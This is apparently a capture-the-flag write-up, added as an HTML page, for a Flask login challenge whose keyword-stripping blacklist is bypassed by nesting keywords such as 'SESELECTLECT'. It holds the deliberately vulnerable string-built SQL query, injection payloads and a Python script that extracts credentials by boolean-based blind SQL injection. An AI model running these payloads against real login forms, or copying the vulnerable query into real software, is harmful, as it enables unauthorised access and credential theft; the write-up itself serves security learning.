@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Awkward Bypass</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav id="load-navbar"></nav>
+        <br />
+        <br />
+        <hr />    
+    </div>
+
+    <div id="tags">
+        <h5>Tags</h5>
+        <ul>
+            <li>flask</li>
+            <li>filter bypass</li>
+            <li>sqlite</li>
+            <li>boolean-based sql injection</li>
+            <li>data exfiltration</li>
+        </ul>
+    </div>
+
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="Awkward_Bypass_0"></a>Awkward_Bypass</h1>
+<h2 class="code-line" data-line-start=1 data-line-end=2><a id="Description_1"></a>Description</h2>
+<p class="has-line-data" data-line-start="2" data-line-end="3">This blacklist is so awkward, it will make you wonder if you know how to spell…</p>
+<h2 class="code-line" data-line-start=4 data-line-end=5><a id="Files_4"></a>Files</h2>
+<p class="has-line-data" data-line-start="5" data-line-end="6">Provided source code</p>
+<h2 class="code-line" data-line-start=7 data-line-end=8><a id="Code_7"></a>Code</h2>
+<h3 class="code-line" data-line-start=8 data-line-end=9><a id="apppy_8"></a><code>app.py</code></h3>
+<pre><code class="has-line-data" data-line-start="10" data-line-end="55" class="language-python"><span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> sqlite3
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, url_for, request, redirect, make_response
+
+app = Flask(__name__)
+
+blacklist = [<span class="hljs-string">"ABORT"</span>, <span class="hljs-string">"ACTION"</span>, <span class="hljs-string">"ADD"</span>, <span class="hljs-string">"AFTER"</span>, <span class="hljs-string">"ALL"</span>, <span class="hljs-string">"ALTER"</span>, <span class="hljs-string">"ALWAYS"</span>, <span class="hljs-string">"ANALYZE"</span>, <span class="hljs-string">"AND"</span>, <span class="hljs-string">"AS"</span>, <span class="hljs-string">"ASC"</span>, <span class="hljs-string">"ATTACH"</span>, <span class="hljs-string">"AUTOINCREMENT"</span>, <span class="hljs-string">"BEFORE"</span>, <span class="hljs-string">"BEGIN"</span>, <span class="hljs-string">"BETWEEN"</span>, <span class="hljs-string">"CASCADE"</span>, <span class="hljs-string">"CASE"</span>, <span class="hljs-string">"CAST"</span>, <span class="hljs-string">"CHECK"</span>, <span class="hljs-string">"COLLATE"</span>, <span class="hljs-string">"COLUMN"</span>, <span class="hljs-string">"COMMIT"</span>, <span class="hljs-string">"CONFLICT"</span>, <span class="hljs-string">"CONSTRAINT"</span>, <span class="hljs-string">"CREATE"</span>, <span class="hljs-string">"CROSS"</span>, <span class="hljs-string">"CURRENT"</span>, <span class="hljs-string">"CURRENT_DATE"</span>, <span class="hljs-string">"CURRENT_TIME"</span>, <span class="hljs-string">"CURRENT_TIMESTAMP"</span>, <span class="hljs-string">"DATABASE"</span>, <span class="hljs-string">"DEFAULT"</span>, <span class="hljs-string">"DEFERRABLE"</span>, <span class="hljs-string">"DEFERRED"</span>, <span class="hljs-string">"DELETE"</span>, <span class="hljs-string">"DESC"</span>, <span class="hljs-string">"DETACH"</span>, <span class="hljs-string">"DISTINCT"</span>, <span class="hljs-string">"DO"</span>, <span class="hljs-string">"DROP"</span>, <span class="hljs-string">"EACH"</span>, <span class="hljs-string">"ELSE"</span>, <span class="hljs-string">"END"</span>, <span class="hljs-string">"ESCAPE"</span>, <span class="hljs-string">"EXCEPT"</span>, <span class="hljs-string">"EXCLUDE"</span>, <span class="hljs-string">"EXCLUSIVE"</span>, <span class="hljs-string">"EXISTS"</span>, <span class="hljs-string">"EXPLAIN"</span>, <span class="hljs-string">"FAIL"</span>, <span class="hljs-string">"FILTER"</span>, <span class="hljs-string">"FIRST"</span>, <span class="hljs-string">"FOLLOWING"</span>, <span class="hljs-string">"FOR"</span>, <span class="hljs-string">"FOREIGN"</span>, <span class="hljs-string">"FROM"</span>, <span class="hljs-string">"FULL"</span>, <span class="hljs-string">"GENERATED"</span>, <span class="hljs-string">"GLOB"</span>, <span class="hljs-string">"GROUP"</span>, <span class="hljs-string">"GROUPS"</span>, <span class="hljs-string">"HAVING"</span>, <span class="hljs-string">"IF"</span>, <span class="hljs-string">"IGNORE"</span>, <span class="hljs-string">"IMMEDIATE"</span>, <span class="hljs-string">"IN"</span>, <span class="hljs-string">"INDEX"</span>, <span class="hljs-string">"INDEXED"</span>, <span class="hljs-string">"INITIALLY"</span>, <span class="hljs-string">"INNER"</span>, <span class="hljs-string">"INSERT"</span>, <span class="hljs-string">"INSTEAD"</span>, <span class="hljs-string">"INTERSECT"</span>, <span class="hljs-string">"INTO"</span>, <span class="hljs-string">"IS"</span>, <span class="hljs-string">"ISNULL"</span>, <span class="hljs-string">"JOIN"</span>, <span class="hljs-string">"KEY"</span>, <span class="hljs-string">"LAST"</span>, <span class="hljs-string">"LEFT"</span>, <span class="hljs-string">"LIKE"</span>, <span class="hljs-string">"LIMIT"</span>, <span class="hljs-string">"MATCH"</span>, <span class="hljs-string">"MATERIALIZED"</span>, <span class="hljs-string">"NATURAL"</span>, <span class="hljs-string">"NO"</span>, <span class="hljs-string">"NOT"</span>, <span class="hljs-string">"NOTHING"</span>, <span class="hljs-string">"NOTNULL"</span>, <span class="hljs-string">"NULL"</span>, <span class="hljs-string">"NULLS"</span>, <span class="hljs-string">"OF"</span>, <span class="hljs-string">"OFFSET"</span>, <span class="hljs-string">"ON"</span>, <span class="hljs-string">"OR"</span>, <span class="hljs-string">"ORDER"</span>, <span class="hljs-string">"OTHERS"</span>, <span class="hljs-string">"OUTER"</span>, <span class="hljs-string">"OVER"</span>, <span class="hljs-string">"PARTITION"</span>, <span class="hljs-string">"PLAN"</span>, <span class="hljs-string">"PRAGMA"</span>, <span class="hljs-string">"PRECEDING"</span>, <span class="hljs-string">"PRIMARY"</span>, <span class="hljs-string">"QUERY"</span>, <span class="hljs-string">"RAISE"</span>, <span class="hljs-string">"RANGE"</span>, <span class="hljs-string">"RECURSIVE"</span>, <span class="hljs-string">"REFERENCES"</span>, <span class="hljs-string">"REGEXP"</span>, <span class="hljs-string">"REINDEX"</span>, <span class="hljs-string">"RELEASE"</span>, <span class="hljs-string">"RENAME"</span>, <span class="hljs-string">"REPLACE"</span>, <span class="hljs-string">"RESTRICT"</span>, <span class="hljs-string">"RETURNING"</span>, <span class="hljs-string">"RIGHT"</span>, <span class="hljs-string">"ROLLBACK"</span>, <span class="hljs-string">"ROW"</span>, <span class="hljs-string">"ROWS"</span>, <span class="hljs-string">"SAVEPOINT"</span>, <span class="hljs-string">"SELECT"</span>, <span class="hljs-string">"SET"</span>, <span class="hljs-string">"TABLE"</span>, <span class="hljs-string">"TEMP"</span>, <span class="hljs-string">"TEMPORARY"</span>, <span class="hljs-string">"THEN"</span>, <span class="hljs-string">"TIES"</span>, <span class="hljs-string">"TO"</span>, <span class="hljs-string">"TRANSACTION"</span>, <span class="hljs-string">"TRIGGER"</span>, <span class="hljs-string">"UNBOUNDED"</span>, <span class="hljs-string">"UNION"</span>, <span class="hljs-string">"UNIQUE"</span>, <span class="hljs-string">"UPDATE"</span>, <span class="hljs-string">"USING"</span>, <span class="hljs-string">"VACUUM"</span>, <span class="hljs-string">"VALUES"</span>, <span class="hljs-string">"VIEW"</span>, <span class="hljs-string">"VIRTUAL"</span>, <span class="hljs-string">"WHEN"</span>, <span class="hljs-string">"WHERE"</span>, <span class="hljs-string">"WINDOW"</span>, <span class="hljs-string">"WITH"</span>, <span class="hljs-string">"WITHOUT"</span>] 
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkCreds</span><span class="hljs-params">(username, password)</span>:</span>
+    con = sqlite3.connect(<span class="hljs-string">'database.db'</span>)
+    cur = con.cursor()
+    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> blacklist:
+        regex = re.compile(n, re.IGNORECASE)
+        username = regex.sub(<span class="hljs-string">""</span>, username)
+    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> blacklist:
+        regex = re.compile(n, re.IGNORECASE)
+        password = regex.sub(<span class="hljs-string">""</span>, password)
+    print(f<span class="hljs-string">"SELECT * FROM users WHERE username='{username}' AND password='{password}'"</span>)     
+    <span class="hljs-keyword">try</span>:
+        content = cur.execute(f<span class="hljs-string">"SELECT * FROM users WHERE username='{username}' AND password='{password}'"</span>).fetchall()
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+    cur.close()
+    con.close()
+    <span class="hljs-keyword">if</span> content == []:
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
+
+<span class="hljs-decorator">@app.route('/')</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"index.html"</span>)
+
+<span class="hljs-decorator">@app.route('/user', methods=['POST'])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">user</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'POST'</span>: 
+        username = request.values[<span class="hljs-string">'username'</span>]
+        password = request.values[<span class="hljs-string">'password'</span>]
+        <span class="hljs-keyword">if</span> checkCreds(username, password) == <span class="hljs-keyword">True</span>:
+            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"user.html"</span>)
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">return</span> <span class="hljs-string">"Error"</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"user.html"</span>)
+</code></pre>
+<h2 class="code-line" data-line-start=56 data-line-end=57><a id="Methodology_56"></a>Methodology</h2>
+<p class="has-line-data" data-line-start="57" data-line-end="58">It’a a simple webpage that asks for credentials.</p>
+<p class="has-line-data" data-line-start="59" data-line-end="60"><img src="./web.PNG" alt="web"></p>
+<p class="has-line-data" data-line-start="61" data-line-end="62">Our creds are passed to the <code>checkCreds</code> method and on success displays <code>user.html</code> and on error <code>'Error'</code>. The creds are checked against <code>sqlite</code> database but before that the program <code>!!!deletes!!!</code> forbidden words from the input. The the ‘clean’ input is passed into the query. We can bypass the filtering logic by dividing our input words like this.</p>
+<p class="has-line-data" data-line-start="63" data-line-end="64">SESELECTLECT : is filtered into SELECT</p>
+<p class="has-line-data" data-line-start="65" data-line-end="66">FRFROMOM : is filtered into FROM</p>
+<p class="has-line-data" data-line-start="67" data-line-end="69">and so on… we can construct a valid query.<br>
+To successfuly launch an SQLi attack we escape username in the query with a singlequote <code>'</code>. Sample query would look like this. We would want to get names of all the tables from the database.</p>
+<p class="has-line-data" data-line-start="70" data-line-end="71"><code>' OorR 1==1 UNUNIOONNIOONN SESELECTLECT name,NNullULL FRFROMOM sqlite_maasster;-- -</code></p>
+<p class="has-line-data" data-line-start="72" data-line-end="73"><img src="./pwn1.PNG" alt="pwn1"></p>
+<p class="has-line-data" data-line-start="74" data-line-end="75">result (user.html)</p>
+<p class="has-line-data" data-line-start="76" data-line-end="77"><img src="./pwn2.PNG" alt="pwn2"></p>
+<p class="has-line-data" data-line-start="78" data-line-end="79">This approach works but we won’t get data from the database. We only get <code>user.html</code> or error. This hints to be a <code>boolean-based sql injection</code>.</p>
+<h2 class="code-line" data-line-start=80 data-line-end=81><a id="Exploit_80"></a>Exploit</h2>
+<p class="has-line-data" data-line-start="81" data-line-end="82">We have to exfiltrate db data byte by byte using <code>substr</code> operation in <code>sqlite</code>. This way we can iterate byte by byte over the strings in the table and get what we want. We will first check the first letter of the <code>username</code> column and iterate over the alphabet (or <code>string.printable</code>) to get a match. If it is a match we get <code>user.html</code> and if not we get <code>Error!</code>. We use this approach with every letter of the username and password column.</p>
+<h2 class="code-line" data-line-start=83 data-line-end=84><a id="Exploit_code_83"></a>Exploit code</h2>
+<pre><code class="has-line-data" data-line-start="85" data-line-end="109" class="language-python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> string
+
+db_data = <span class="hljs-string">''</span>
+<span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):
+  <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> string.printable:
+    <span class="hljs-comment"># username</span>
+    p = <span class="hljs-string">"\\' OORR 1=1 AANDND (SESELECTLECT hex(substr(username,"</span> + str(pos) + <span class="hljs-string">",1)) FRFROMOM users) = hex('"</span> + str(char) + <span class="hljs-string">"')-- -"</span>
+
+    <span class="hljs-comment"># password</span>
+    <span class="hljs-comment">#p = "\\' OORR 1=1 AANDND (SESELECTLECT hex(substr(paassswoorrd," + str(pos) + ",1)) FRFROMOM users) = hex('" + str(char) + "')-- -"</span>
+    
+    h = {<span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/x-www-form-urlencoded'</span>}
+    d = {<span class="hljs-string">'username'</span>: p, <span class="hljs-string">'password'</span>: <span class="hljs-string">'pwn'</span>}
+    r = requests.post(<span class="hljs-string">'https://awkward-bypass.chal.imaginaryctf.org/user'</span>, headers=h, data=d)
+    
+    <span class="hljs-comment"># successful call</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-string">'Ummmmmmm, did you expect a flag to be here?'</span> <span class="hljs-keyword">in</span> r.content.decode():
+      db_data += str(char)
+      print(db_data)
+      <span class="hljs-keyword">break</span>
+
+print(<span class="hljs-string">'Final: '</span> + db_data)
+</code></pre>
+<h2 class="code-line" data-line-start=110 data-line-end=111><a id="Loot_110"></a>Loot</h2>
+<p class="has-line-data" data-line-start="111" data-line-end="112">Username</p>
+<p class="has-line-data" data-line-start="113" data-line-end="114"><img src="./exf1.PNG" alt="exf1"></p>
+<p class="has-line-data" data-line-start="115" data-line-end="116">Password</p>
+<p class="has-line-data" data-line-start="117" data-line-end="118"><img src="./exf2.PNG" alt="exf2"></p>
+<h2 class="code-line" data-line-start=119 data-line-end=120><a id="Flag_119"></a>Flag</h2>
+<p class="has-line-data" data-line-start="120" data-line-end="121"><strong>ictf{n13_fil73r_byp@ss_7130676d}</strong></p>
+
+    <script src="/js/navbar.js"></script>
+</body>
+
+</html>
